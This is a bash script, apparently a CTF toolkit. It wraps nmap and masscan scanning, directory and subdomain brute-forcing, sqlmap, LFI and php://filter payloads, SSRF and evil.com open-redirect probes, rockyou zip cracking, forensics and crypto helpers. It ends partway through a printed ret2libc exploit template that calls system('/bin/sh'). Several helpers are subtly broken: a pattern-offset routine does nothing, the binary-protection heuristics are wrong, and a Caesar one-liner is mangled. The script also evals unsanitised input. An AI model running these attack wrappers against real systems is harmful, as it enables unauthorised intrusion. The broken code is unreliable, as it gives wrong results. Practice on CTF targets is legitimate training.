#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════╗
# ║         AlEnezi Tool — ALL-IN-ONE CTF TERMINAL TOOLKIT              ║
# ║         aka  S I T E  |  github.com/AlEnezi                         ║
# ╚══════════════════════════════════════════════════════════════════════╝
# Version: 2.0 | Author: AlEnezi

set -euo pipefail
IFS=$'\n\t'

# ─── COLORS & STYLES ────────────────────────────────────────────────
R='\033[0;31m'   RB='\033[1;31m'
G='\033[0;32m'   GB='\033[1;32m'
Y='\033[0;33m'   YB='\033[1;33m'
B='\033[0;34m'   BB='\033[1;34m'
M='\033[0;35m'   MB='\033[1;35m'
C='\033[0;36m'   CB='\033[1;36m'
W='\033[0;37m'   WB='\033[1;37m'
DIM='\033[2m'    UL='\033[4m'    BLK='\033[5m'
NC='\033[0m'     BOLD='\033[1m'
BG_B='\033[44m'  BG_R='\033[41m'  BG_G='\033[42m'  BG_K='\033[40m'

# ─── STATE ──────────────────────────────────────────────────────────
NOTES_FILE="$HOME/.alenezi_notes.txt"
FLAGS_FILE="$HOME/.alenezi_flags.txt"
SESSION_TARGET=""
SESSION_LOG="$HOME/.alenezi_session.log"
WORDLIST_DIR="/usr/share/wordlists"
[[ ! -f "$NOTES_FILE" ]] && touch "$NOTES_FILE"
[[ ! -f "$FLAGS_FILE" ]] && touch "$FLAGS_FILE"
[[ ! -f "$SESSION_LOG" ]] && touch "$SESSION_LOG"

# ─── HELPERS ────────────────────────────────────────────────────────
banner() {
  clear
  echo -e "${CB}"
  cat << 'EOF'
  ╔══════════════════════════════════════════════════════════════════════════╗
  ║                                                                          ║
  ║    ▄▄▄       ██▓    ▓█████  ███▄    █ ▓█████ ▒███████▒ ██▓             ║
  ║   ▒████▄    ▓██▒    ▓█   ▀  ██ ▀█   █ ▓█   ▀ ▒ ▒ ▒ ▄▀░▓██▒            ║
  ║   ▒██  ▀█▄  ▒██░    ▒███   ▓██  ▀█ ██▒▒███   ░ ▒ ▄▀▒░ ▒██▒            ║
  ║   ░██▄▄▄▄██ ▒██░    ▒▓█  ▄ ▓██▒  ▐▌██▒▒▓█  ▄  ▄▀▒   ░ ░██░            ║
  ║    ▓█   ▓██▒░██████▒░▒████▒▒██░   ▓██░░▒████▒▒███████▒ ░██░            ║
  ║    ▒▒   ▓▒█░░ ▒░▓  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░░ ▒░ ░░▒▒ ▓░▒░▒ ░▓             ║
  ║     ▒   ▒▒ ░░ ░ ▒  ░ ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░░░▒ ▒ ░ ▒  ▒ ░          ║
  ║     ░   ▒     ░ ░      ░      ░   ░ ░    ░   ░ ░ ░ ░ ░  ▒ ░           ║
  ║         ░  ░    ░  ░   ░  ░         ░    ░  ░  ░ ░      ░             ║
  ║                                                                          ║
  ║          ████████╗ ██████╗  ██████╗ ██╗                                 ║
  ║             ██╔══╝██╔═══██╗██╔═══██╗██║                                 ║
  ║             ██║   ██║   ██║██║   ██║██║                                 ║
  ║             ██║   ██║   ██║██║   ██║██║                                 ║
  ║             ██║   ╚██████╔╝╚██████╔╝███████╗                            ║
  ║             ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                            ║
  ║                                                                          ║
  ║         ☠  AlEnezi Tool  aka  S I T E  — CTF Toolkit  ☠                ║
  ║              github.com/AlEnezi  |  v2.0                                ║
  ╚══════════════════════════════════════════════════════════════════════════╝
EOF
  echo -e "${NC}"
  local t
  t=$(date '+%Y-%m-%d %H:%M:%S')
  echo -e "  ${DIM}${C}Session: ${t}${NC}  ${DIM}${Y}Target: ${SESSION_TARGET:-[not set]}${NC}"
  echo -e "  ${DIM}${G}Flags captured: $(wc -l < "$FLAGS_FILE")${NC}"
  echo ""
}

hdr() {
  echo ""
  echo -e "  ${BG_K}${CB}  ⚔  $1  ${NC}"
  echo -e "  ${DIM}${C}$(printf '─%.0s' {1..60})${NC}"
  echo ""
}

ok()   { echo -e "  ${GB}[✔]${NC} $*"; }
err()  { echo -e "  ${RB}[✘]${NC} $*"; }
info() { echo -e "  ${CB}[➤]${NC} $*"; }
warn() { echo -e "  ${YB}[!]${NC} $*"; }
ask()  { echo -ne "  ${MB}[?]${NC} $1 "; }

pause()    { echo ""; ask "Press ENTER to continue..."; read -r; }
log_cmd()  { echo "[$(date '+%H:%M:%S')] $*" >> "$SESSION_LOG"; }

check_tool() {
  if command -v "$1" &>/dev/null; then
    echo -e "  ${GB}[✔]${NC} ${WB}$1${NC} ${DIM}($(command -v "$1"))${NC}"
    return 0
  else
    echo -e "  ${RB}[✘]${NC} ${WB}$1${NC} ${DIM}(not installed)${NC}"
    return 1
  fi
}

run_cmd() {
  local label="$1"; shift
  info "Running: ${YB}$*${NC}"
  log_cmd "$*"
  echo -e "  ${DIM}$(printf '─%.0s' {1..60})${NC}"
  eval "$@" 2>&1 | sed 's/^/  /'
  echo -e "  ${DIM}$(printf '─%.0s' {1..60})${NC}"
  ok "$label done."
}

# ─── TOOL CHECK ─────────────────────────────────────────────────────
menu_toolcheck() {
  hdr "TOOL AVAILABILITY CHECK"
  local tools=(nmap masscan gobuster dirb nikto curl wget sqlmap \
    hydra john hashcat aircrack-ng \
    binwalk steghide exiftool foremost strings xxd \
    gdb ltrace strace objdump readelf \
    openssl base64 python3 ruby perl \
    netcat nc socat metasploit-framework \
    wireshark tshark tcpdump \
    volatility volatility3 \
    radare2 ghidra jadx \
    ffuf wfuzz \
    pwntools ROPgadget \
    git docker)
  
  echo -e "  ${YB}Checking $(echo ${tools[@]} | wc -w) tools...${NC}"
  echo ""
  local have=0 miss=0
  for t in "${tools[@]}"; do
    if check_tool "$t"; then ((have++)); else ((miss++)); fi
  done
  echo ""
  ok "Installed: ${GB}$have${NC}   Missing: ${RB}$miss${NC}"
  
  echo ""
  warn "Quick install for missing tools (Debian/Ubuntu):"
  echo -e "  ${DIM}sudo apt update && sudo apt install -y nmap gobuster nikto hydra john hashcat binwalk steghide exiftool foremost gdb ltrace strace openssl python3 netcat-openbsd socat wireshark tshark tcpdump radare2 ffuf${NC}"
  pause
}

# ─── 1. RECON & ENUMERATION ─────────────────────────────────────────
menu_recon() {
  while true; do
    hdr "RECON & ENUMERATION"
    echo -e "  ${YB}1${NC}) Full TCP Nmap Scan                ${YB}6${NC}) UDP Scan (top 200)"
    echo -e "  ${YB}2${NC}) Quick Nmap (top 1000 ports)       ${YB}7${NC}) OS + Version Detection"
    echo -e "  ${YB}3${NC}) Aggressive Nmap (-A)              ${YB}8${NC}) Nmap Vuln Scripts"
    echo -e "  ${YB}4${NC}) Stealth SYN Scan                  ${YB}9${NC}) Masscan Fast Sweep"
    echo -e "  ${YB}5${NC}) All Ports (1-65535)               ${YB}0${NC}) ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    ask "Target IP/Host [${SESSION_TARGET:-enter now}]:"; read -r target
    [[ -z "$target" && -n "$SESSION_TARGET" ]] && target="$SESSION_TARGET"
    [[ -z "$target" ]] && { err "No target!"; pause; continue; }
    SESSION_TARGET="$target"
    case "$c" in
      1) run_cmd "Full TCP Scan" "nmap -sC -sV -p- -T4 --open $target" ;;
      2) run_cmd "Quick Scan"    "nmap -sC -sV -T4 $target" ;;
      3) run_cmd "Aggressive"    "nmap -A -T4 $target" ;;
      4) run_cmd "Stealth SYN"   "nmap -sS -T4 $target" ;;
      5) run_cmd "All Ports"     "nmap -p 1-65535 -T4 $target" ;;
      6) run_cmd "UDP Top 200"   "nmap -sU --top-ports 200 $target" ;;
      7) run_cmd "OS+Version"    "nmap -O -sV $target" ;;
      8) run_cmd "Vuln Scripts"  "nmap --script=vuln $target" ;;
      9) run_cmd "Masscan"       "masscan $target -p0-65535 --rate=10000 2>/dev/null || echo '[!] masscan not installed'" ;;
    esac
    pause
  done
}

# ─── 2. WEB EXPLOITATION ────────────────────────────────────────────
menu_web() {
  while true; do
    hdr "WEB EXPLOITATION"
    echo -e "  ${CB}1${NC}) Directory Bruteforce (gobuster)   ${CB}9${NC})  HTTP Methods Enum"
    echo -e "  ${CB}2${NC}) Dir Scan (dirb)                   ${CB}10${NC}) Nikto Full Scan"
    echo -e "  ${CB}3${NC}) Fuzzing (ffuf)                    ${CB}11${NC}) SQLMap (URL)"
    echo -e "  ${CB}4${NC}) GET Request (curl)                ${CB}12${NC}) LFI Wordlist Fuzz"
    echo -e "  ${CB}5${NC}) POST Request (curl)               ${CB}13${NC}) PHP Filter Base64"
    echo -e "  ${CB}6${NC}) Headers & Cookies                 ${CB}14${NC}) SSRF Test"
    echo -e "  ${CB}7${NC}) Subdomain Enum                    ${CB}15${NC}) Open Redirect"
    echo -e "  ${CB}8${NC}) Virtual Host Enum                 ${CB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        ask "URL (http://target):"; read -r url
        ask "Wordlist [/usr/share/wordlists/dirb/common.txt]:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/dirb/common.txt"
        run_cmd "GoBuster" "gobuster dir -u $url -w $wl -t 50 --no-error 2>/dev/null"
        ;;
      2)
        ask "URL:"; read -r url
        run_cmd "DIRB" "dirb $url 2>/dev/null"
        ;;
      3)
        ask "URL with FUZZ keyword (e.g. http://site/FUZZ):"; read -r url
        ask "Wordlist:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/dirb/common.txt"
        run_cmd "FFUF" "ffuf -u '$url' -w $wl -t 50 2>/dev/null"
        ;;
      4)
        ask "URL:"; read -r url
        run_cmd "curl GET" "curl -s -i -L '$url'"
        ;;
      5)
        ask "URL:"; read -r url
        ask "POST data (e.g. user=admin&pass=test):"; read -r data
        run_cmd "curl POST" "curl -s -i -X POST -d '$data' '$url'"
        ;;
      6)
        ask "URL:"; read -r url
        run_cmd "Headers" "curl -s -I '$url'"
        ;;
      7)
        ask "Domain:"; read -r domain
        ask "Wordlist [/usr/share/wordlists/dirb/common.txt]:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/dirb/common.txt"
        run_cmd "Subdomain" "gobuster dns -d $domain -w $wl -t 50 2>/dev/null"
        ;;
      8)
        ask "URL:"; read -r url
        ask "Domain:"; read -r domain
        ask "Wordlist:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/dirb/common.txt"
        run_cmd "VHost" "ffuf -u '$url' -H 'Host: FUZZ.$domain' -w $wl 2>/dev/null"
        ;;
      9)
        ask "URL:"; read -r url
        for m in GET POST PUT DELETE OPTIONS PATCH TRACE; do
          echo -ne "  ${YB}$m${NC}: "
          curl -s -o /dev/null -w "%{http_code}" -X "$m" "$url" 2>/dev/null
          echo ""
        done
        ;;
      10)
        ask "URL:"; read -r url
        run_cmd "Nikto" "nikto -h '$url' 2>/dev/null"
        ;;
      11)
        ask "URL (with param e.g. http://site/page?id=1):"; read -r url
        run_cmd "SQLMap" "sqlmap -u '$url' --batch --dbs 2>/dev/null"
        ;;
      12)
        ask "URL with FUZZ (e.g. http://site/page?file=FUZZ):"; read -r url
        run_cmd "LFI Fuzz" "ffuf -u '$url' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt 2>/dev/null || echo 'Install seclists for LFI list'"
        ;;
      13)
        ask "URL with ?page=FUZZ:"; read -r url
        local payload="php://filter/convert.base64-encode/resource="
        ask "File to read (e.g. index):"; read -r f
        run_cmd "PHP Filter" "curl -s '${url}${payload}${f}' | base64 -d 2>/dev/null"
        ;;
      14)
        ask "URL:"; read -r url
        ask "SSRF payload (e.g. http://127.0.0.1:80):"; read -r ssrf
        run_cmd "SSRF" "curl -s '$url' --data 'url=$ssrf'"
        ;;
      15)
        ask "URL with ?redirect=FUZZ:"; read -r url
        run_cmd "Open Redirect" "curl -sI '${url}http://evil.com' | grep -i location"
        ;;
    esac
    pause
  done
}

# ─── 3. CRYPTO & ENCODING ───────────────────────────────────────────
menu_crypto() {
  while true; do
    hdr "CRYPTO & ENCODING"
    echo -e "  ${GB}1${NC})  Base64 Encode/Decode             ${GB}11${NC}) XOR Brute (1 byte)"
    echo -e "  ${GB}2${NC})  Hex Encode/Decode                ${GB}12${NC}) Vigenere Decrypt"
    echo -e "  ${GB}3${NC})  Binary to ASCII                  ${GB}13${NC}) Atbash Cipher"
    echo -e "  ${GB}4${NC})  ASCII to Binary                  ${GB}14${NC}) Morse Code Decode"
    echo -e "  ${GB}5${NC})  ROT13                            ${GB}15${NC}) Hash Identify"
    echo -e "  ${GB}6${NC})  ROT-N (custom)                   ${GB}16${NC}) MD5/SHA Hash"
    echo -e "  ${GB}7${NC})  URL Encode/Decode                ${GB}17${NC}) RSA Quick Decrypt"
    echo -e "  ${GB}8${NC})  HTML Entity Decode               ${GB}18${NC}) OpenSSL AES Decrypt"
    echo -e "  ${GB}9${NC})  JWT Decode                       ${GB}19${NC}) Caesar All Rotations"
    echo -e "  ${GB}10${NC}) Decimal ↔ ASCII                  ${GB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        ask "Encode(e) or Decode(d)?"; read -r mode
        ask "Input:"; read -r input
        if [[ "$mode" == "e" ]]; then echo "$input" | base64
        else echo "$input" | base64 -d 2>/dev/null || echo "$input" | base64 -d -i 2>/dev/null; fi
        ;;
      2)
        ask "Encode(e) or Decode(d)?"; read -r mode
        ask "Input:"; read -r input
        if [[ "$mode" == "e" ]]; then
          echo -n "$input" | xxd -p | tr -d '\n'; echo
        else
          echo "$input" | xxd -r -p 2>/dev/null || python3 -c "import binascii; print(binascii.unhexlify('$input').decode('latin1'))"
        fi
        ;;
      3)
        ask "Binary string (space-separated bytes):"; read -r bin
        python3 -c "b='$bin'.split(); print(''.join(chr(int(x,2)) for x in b))"
        ;;
      4)
        ask "ASCII string:"; read -r asc
        python3 -c "s='$asc'; print(' '.join(format(ord(c),'08b') for c in s))"
        ;;
      5)
        ask "Input:"; read -r input
        echo "$input" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
        ;;
      6)
        ask "Input:"; read -r input
        ask "Rotation (1-25):"; read -r n
        python3 -c "
s='$input'; n=$n
r=''
for c in s:
    if c.isupper(): r+=chr((ord(c)-65+n)%26+65)
    elif c.islower(): r+=chr((ord(c)-97+n)%26+97)
    else: r+=c
print(r)"
        ;;
      7)
        ask "Encode(e) or Decode(d)?"; read -r mode
        ask "Input:"; read -r input
        if [[ "$mode" == "e" ]]; then
          python3 -c "from urllib.parse import quote; print(quote('$input'))"
        else
          python3 -c "from urllib.parse import unquote; print(unquote('$input'))"
        fi
        ;;
      8)
        ask "HTML encoded input:"; read -r input
        python3 -c "from html import unescape; print(unescape('$input'))"
        ;;
      9)
        ask "JWT token:"; read -r jwt
        echo -e "\n  ${YB}Header:${NC}"; echo "${jwt}" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
        echo -e "\n  ${YB}Payload:${NC}"; echo "${jwt}" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
        ;;
      10)
        ask "Decimal values (space-separated):"; read -r dec
        python3 -c "print(''.join(chr(int(x)) for x in '$dec'.split()))"
        ;;
      11)
        ask "Hex ciphertext:"; read -r ct
        python3 -c "
ct=bytes.fromhex('$ct')
for k in range(256):
    out=bytes(b^k for b in ct)
    try:
        s=out.decode('ascii')
        if all(32<=ord(c)<127 for c in s):
            print(f'Key=0x{k:02x} ({k:3d}): {s}')
    except: pass
"
        ;;
      12)
        ask "Ciphertext:"; read -r ct
        ask "Key:"; read -r key
        python3 -c "
c,k='$ct','$key'; k=k.lower(); ki=0; r=''
for ch in c:
    if ch.isalpha():
        s=65 if ch.isupper() else 97
        r+=chr((ord(ch)-s-ord(k[ki%len(k)])+97)%26+s); ki+=1
    else: r+=ch
print(r)"
        ;;
      13)
        ask "Input:"; read -r input
        echo "$input" | tr 'A-Za-z' 'Z-Az-a'
        ;;
      14)
        ask "Morse (dots/dashes, space between letters, / between words):"; read -r morse
        python3 -c "
m={'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9'}
words='$morse'.split('/')
print(' '.join(''.join(m.get(s,'?') for s in w.split()) for w in words))"
        ;;
      15)
        ask "Hash to identify:"; read -r hash
        local len=${#hash}
        echo -e "\n  ${YB}Hash length: $len chars${NC}"
        case $len in
          32)  info "Likely: MD5, NTLM, LM" ;;
          40)  info "Likely: SHA1, MySQL4.1+" ;;
          56)  info "Likely: SHA-224" ;;
          64)  info "Likely: SHA-256, Keccak-256" ;;
          96)  info "Likely: SHA-384" ;;
          128) info "Likely: SHA-512, Whirlpool" ;;
          *)   info "Unknown length — check hash-identifier" ;;
        esac
        python3 -c "
import hashlib, re
h='$hash'
patterns=[
    (r'^\\\$2[ayb]\\\$.{56}\$','bcrypt'),
    (r'^\\\$6\\\$.{86}\$','sha512crypt'),
    (r'^\\\$1\\\$.{22}\$','md5crypt'),
    (r'^[0-9a-f]{32}\$','MD5/NTLM'),
    (r'^[0-9a-f]{40}\$','SHA1'),
    (r'^[0-9a-f]{64}\$','SHA256'),
    (r'^[0-9a-f]{128}\$','SHA512'),
]
for pat,name in patterns:
    if re.match(pat,h,re.I): print(f'  Match: {name}')
" 2>/dev/null
        ;;
      16)
        ask "Input string:"; read -r input
        echo -e "  ${YB}MD5:${NC}    $(echo -n "$input" | md5sum | cut -d' ' -f1)"
        echo -e "  ${YB}SHA1:${NC}   $(echo -n "$input" | sha1sum | cut -d' ' -f1)"
        echo -e "  ${YB}SHA256:${NC} $(echo -n "$input" | sha256sum | cut -d' ' -f1)"
        echo -e "  ${YB}SHA512:${NC} $(echo -n "$input" | sha512sum | cut -d' ' -f1)"
        ;;
      17)
        ask "n (modulus, decimal):"; read -r n
        ask "e (exponent):"; read -r e
        ask "c (ciphertext, decimal):"; read -r ci
        python3 -c "
from sympy.ntheory.factor_ import factorint
import gmpy2
n,e,c=int('$n'),int('$e'),int('$ci')
print('Factoring n (may take time)...')
f=factorint(n)
ps=list(f.keys())
if len(ps)==2:
    p,q=ps; phi=(p-1)*(q-1)
    d=int(gmpy2.invert(e,phi))
    m=pow(c,d,n)
    try: print('Plaintext:',bytes.fromhex(hex(m)[2:]).decode())
    except: print('m=',m)
else: print('Could not factor n')
" 2>/dev/null || info "Install sympy+gmpy2: pip3 install sympy gmpy2"
        ;;
      18)
        ask "Encrypted file path:"; read -r f
        ask "Key:"; read -r key
        openssl enc -aes-256-cbc -d -in "$f" -k "$key" 2>/dev/null || err "Decryption failed"
        ;;
      19)
        ask "Input:"; read -r input
        echo -e "  ${YB}All Caesar rotations:${NC}"
        for i in $(seq 1 25); do
          r=$(echo "$input" | tr 'A-Za-z' "$(echo {A..Z} {a..z} | tr -d ' ' | cut -c$((i+1))-52$i)" 2>/dev/null || \
              python3 -c "s='$input';n=$i;print(''.join(chr((ord(c)-65+n)%26+65) if c.isupper() else chr((ord(c)-97+n)%26+97) if c.islower() else c for c in s))")
          printf "  ROT-%-2d: %s\n" "$i" "$r"
        done
        ;;
    esac
    pause
  done
}

# ─── 4. STEGANOGRAPHY ───────────────────────────────────────────────
menu_stego() {
  while true; do
    hdr "STEGANOGRAPHY"
    echo -e "  ${MB}1${NC})  strings extraction               ${MB}7${NC})  steghide extract"
    echo -e "  ${MB}2${NC})  xxd hex dump                     ${MB}8${NC})  steghide embed"
    echo -e "  ${MB}3${NC})  binwalk analyze                  ${MB}9${NC})  zsteg (PNG/BMP LSB)"
    echo -e "  ${MB}4${NC})  binwalk extract                  ${MB}10${NC}) exiftool metadata"
    echo -e "  ${MB}5${NC})  file type detection              ${MB}11${NC}) Image magic bytes fix"
    echo -e "  ${MB}6${NC})  foremost carve                   ${MB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    ask "File path:"; read -r f
    [[ ! -f "$f" ]] && { err "File not found: $f"; pause; continue; }
    case "$c" in
      1)  run_cmd "strings" "strings '$f' | grep -v '^.\{1\}$' | head -200" ;;
      2)
        ask "Bytes to dump [all]:"; read -r n
        [[ -z "$n" ]] && run_cmd "xxd" "xxd '$f'" || run_cmd "xxd" "xxd '$f' | head -$((n/16+1))"
        ;;
      3)  run_cmd "binwalk" "binwalk '$f'" ;;
      4)  run_cmd "binwalk extract" "binwalk -e '$f'" ;;
      5)
        run_cmd "file" "file '$f'"
        echo -e "\n  ${YB}Magic bytes (first 16):${NC}"
        xxd "$f" | head -1
        ;;
      6)  run_cmd "foremost" "foremost -i '$f' -o /tmp/foremost_out && ls /tmp/foremost_out/" ;;
      7)
        ask "Passphrase (blank for none):"; read -r pass
        if [[ -z "$pass" ]]; then
          run_cmd "steghide" "steghide extract -sf '$f' -p '' -f 2>&1"
        else
          run_cmd "steghide" "steghide extract -sf '$f' -p '$pass' -f 2>&1"
        fi
        ;;
      8)
        ask "File to embed:"; read -r embed
        ask "Passphrase:"; read -r pass
        run_cmd "steghide embed" "steghide embed -cf '$f' -ef '$embed' -p '$pass'"
        ;;
      9)  run_cmd "zsteg" "zsteg '$f' 2>/dev/null || echo '[!] zsteg not installed (gem install zsteg)'" ;;
      10) run_cmd "exiftool" "exiftool '$f'" ;;
      11)
        echo -e "\n  ${YB}Common magic bytes:${NC}"
        echo -e "  PNG:  89 50 4E 47 0D 0A 1A 0A"
        echo -e "  JPEG: FF D8 FF"
        echo -e "  GIF:  47 49 46 38"
        echo -e "  ZIP:  50 4B 03 04"
        echo -e "  PDF:  25 50 44 46"
        echo -e "  ELF:  7F 45 4C 46"
        echo -e "  BMP:  42 4D"
        echo ""
        ask "Fix magic bytes? (y/N):"; read -r yn
        [[ "$yn" == "y" ]] && warn "Use hex editor (hexedit/ghex) to manually fix bytes"
        ;;
    esac
    pause
  done
}

# ─── 5. FORENSICS ───────────────────────────────────────────────────
menu_forensics() {
  while true; do
    hdr "FORENSICS & MEMORY"
    echo -e "  ${YB}1${NC})  File analysis (file + strings)   ${YB}7${NC})  PCAP analysis (tshark)"
    echo -e "  ${YB}2${NC})  Recover deleted files            ${YB}8${NC})  Extract PCAP HTTP"
    echo -e "  ${YB}3${NC})  Disk image mount                 ${YB}9${NC})  Volatility imageinfo"
    echo -e "  ${YB}4${NC})  Grep for flags                   ${YB}10${NC}) Volatility process list"
    echo -e "  ${YB}5${NC})  Zip/archive extraction           ${YB}11${NC}) Volatility dump proc"
    echo -e "  ${YB}6${NC})  Encrypted zip crack              ${YB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        ask "File path:"; read -r f
        run_cmd "Analysis" "file '$f'; echo ''; strings '$f' | grep -iE 'flag|ctf|password|secret|key|user' | head -50"
        ;;
      2)
        ask "Image/partition path:"; read -r img
        run_cmd "foremost" "foremost -i '$img' -o /tmp/recovered && ls -la /tmp/recovered/"
        ;;
      3)
        ask "Image file:"; read -r img
        ask "Mount point [/mnt/ctf]:"; read -r mp
        [[ -z "$mp" ]] && mp="/mnt/ctf"
        sudo mkdir -p "$mp" && sudo mount -o loop "$img" "$mp" && ok "Mounted at $mp" && ls -la "$mp"
        ;;
      4)
        ask "Path to search:"; read -r path
        ask "Flag format (e.g. CTF{):"; read -r fmt
        [[ -z "$fmt" ]] && fmt="CTF{"
        run_cmd "grep" "grep -r '$fmt' '$path' 2>/dev/null || strings '$path' | grep '$fmt'"
        ;;
      5)
        ask "Archive file:"; read -r f
        case "$f" in
          *.zip)    run_cmd "unzip"   "unzip -l '$f' && unzip '$f' -d /tmp/extracted" ;;
          *.tar*)   run_cmd "tar"     "tar -xvf '$f' -C /tmp/extracted" ;;
          *.gz)     run_cmd "gunzip"  "gunzip -k '$f'" ;;
          *.7z)     run_cmd "7z"      "7z l '$f' && 7z x '$f' -o/tmp/extracted" ;;
          *)        run_cmd "file"    "file '$f'" ;;
        esac
        ;;
      6)
        ask "Encrypted zip file:"; read -r f
        ask "Wordlist [rockyou.txt]:"; read -r wl
        [[ -z "$wl" ]] && wl="/usr/share/wordlists/rockyou.txt"
        run_cmd "zip crack" "john --format=zip --wordlist='$wl' '$f' 2>/dev/null || fcrackzip -D -p '$wl' '$f' 2>/dev/null || echo '[!] Install john or fcrackzip'"
        ;;
      7)
        ask "PCAP file:"; read -r f
        run_cmd "tshark" "tshark -r '$f' -q -z conv,tcp 2>/dev/null"
        ;;
      8)
        ask "PCAP file:"; read -r f
        run_cmd "HTTP extract" "tshark -r '$f' -Y http -T fields -e http.request.method -e http.host -e http.request.uri -e http.file_data 2>/dev/null | head -100"
        ;;
      9)
        ask "Memory dump:"; read -r f
        run_cmd "volatility" "vol.py -f '$f' imageinfo 2>/dev/null || volatility3 -f '$f' windows.info 2>/dev/null"
        ;;
      10)
        ask "Memory dump:"; read -r f
        ask "Profile (e.g. Win7SP1x64):"; read -r prof
        run_cmd "pslist" "vol.py -f '$f' --profile='$prof' pslist 2>/dev/null || volatility3 -f '$f' windows.pslist 2>/dev/null"
        ;;
      11)
        ask "Memory dump:"; read -r f
        ask "Profile:"; read -r prof
        ask "PID to dump:"; read -r pid
        run_cmd "procdump" "vol.py -f '$f' --profile='$prof' procdump -p '$pid' -D /tmp/ 2>/dev/null"
        ;;
    esac
    pause
  done
}

# ─── 6. BINARY EXPLOITATION & PWN ───────────────────────────────────
menu_pwn() {
  while true; do
    hdr "BINARY EXPLOITATION & PWN"
    echo -e "  ${RB}1${NC})  checksec (binary protections)   ${RB}8${NC})  pattern create (cyclic)"
    echo -e "  ${RB}2${NC})  file info + strings              ${RB}9${NC})  pattern offset find"
    echo -e "  ${RB}3${NC})  readelf sections                 ${RB}10${NC}) ret2libc template"
    echo -e "  ${RB}4${NC})  objdump disassemble main         ${RB}11${NC}) shellcode (x86/x64)"
    echo -e "  ${RB}5${NC})  ltrace (lib calls)               ${RB}12${NC}) ROP gadgets"
    echo -e "  ${RB}6${NC})  strace (syscalls)                ${RB}13${NC}) format string fuzz"
    echo -e "  ${RB}7${NC})  GDB run w/ PEDA/pwndbg hint      ${RB}0${NC})  ← Back"
    echo ""
    ask "Choose:"; read -r c
    [[ "$c" == "0" ]] && return
    case "$c" in
      1)
        ask "Binary path:"; read -r f
        if command -v checksec &>/dev/null; then
          run_cmd "checksec" "checksec --file='$f'"
        else
          run_cmd "checksec" "python3 -c \"
import subprocess, sys
b='$f'
out=subprocess.check_output(['readelf','-l',b]).decode()
print('RELRO:  ','Full' if 'GNU_RELRO' in out else 'Partial' if 'DYNAMIC' in out else 'None')
out2=subprocess.check_output(['readelf','-s',b]).decode()
print('STACK:  ','Canary' if '__stack_chk_fail' in out2 else 'No canary')
out3=subprocess.check_output(['file',b]).decode()
print('NX:     ','Enabled' if 'not executable' in out3 else 'Disabled')
print('PIE:    ','Enabled' if 'shared object' in out3 else 'Disabled')
\""
        fi
        ;;
      2)
        ask "Binary path:"; read -r f
        run_cmd "file+strings" "file '$f'; echo; strings '$f' | head -100"
        ;;
      3)
        ask "Binary path:"; read -r f
        run_cmd "readelf" "readelf -S '$f' | head -50"
        ;;
      4)
        ask "Binary path:"; read -r f
        run_cmd "objdump main" "objdump -d -M intel '$f' | grep -A 100 '<main>:' | head -100"
        ;;
      5)
        ask "Binary path:"; read -r f
        run_cmd "ltrace" "ltrace '$f' 2>&1 | head -100"
        ;;
      6)
        ask "Binary path:"; read -r f
        run_cmd "strace" "strace '$f' 2>&1 | head -100"
        ;;
      7)
        ask "Binary path:"; read -r f
        echo -e "\n  ${YB}GDB quick commands:${NC}"
        echo -e "  ${DIM}run, disas main, x/100wx \$esp, info registers, break *main, nexti, stepi${NC}"
        info "Launching gdb..."
        gdb -q "$f" 2>/dev/null || err "gdb not installed"
        ;;
      8)
        ask "Pattern length [100]:"; read -r n
        [[ -z "$n" ]] && n=100
        python3 -c "
import string
chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
pattern=''
for i in range(0,$n//4):
    for a in 'ABCDE':
        for b in 'abcde':
            for c in '01234':
                pattern+=a+b+c+'.'
                if len(pattern)>=$n: break
            if len(pattern)>=$n: break
        if len(pattern)>=$n: break
    if len(pattern)>=$n: break
print(pattern[:$n])"
        ;;
      9)
        ask "Value at EIP/RIP (hex, e.g. 0x41614141):"; read -r val
        python3 -c "
import struct
v=int('$val',16)
chars=b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
# de Bruijn offset approximation
for i in range(0,500):
    pat='Aa'+chr(65+i%26)+chr(48+i//26%10)
print('Offset search: use pwntools cyclic_find or gdb-peda pattern_offset $val')"
        ;;
      10)
        ask "Binary path:"; read -r f
        cat << 'PYEOF'
  ─── ret2libc pwntools template ───────────────────────────────────
  from pwn import *
  elf = ELF('./binary')
  libc = ELF('./libc.so.6')
  p = process('./binary')
  # or: p = remote('host', port)

  # Step 1: Leak libc address
  rop = ROP(elf)
  rop.puts(elf.got['puts'])
  rop.call(elf.symbols['main'])
  payload = flat({OFFSET: rop.chain()})
  p.sendlineafter(b'> ', payload)
  leak = u64(p.recvline()[:6].ljust(8, b'\x00'))
  libc.address = leak - libc.symbols['puts']

  # Step 2: ret2system
  rop2 = ROP(libc)
  rop2.system(next(libc.search(b'/bin/sh')))
  payload2 = flat({OFFSET: rop2.chain()})
